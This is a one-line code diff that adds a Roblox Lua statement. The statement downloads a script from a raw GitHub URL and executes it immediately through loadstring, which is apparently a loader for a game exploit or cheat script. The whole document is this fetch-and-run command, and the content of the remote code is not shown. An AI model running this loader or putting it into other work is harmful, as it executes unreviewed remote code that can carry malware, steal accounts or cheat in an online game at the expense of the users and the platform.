@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/godssssss/Tvgodsss-ts-script-lol/master/Tvgod",true))();
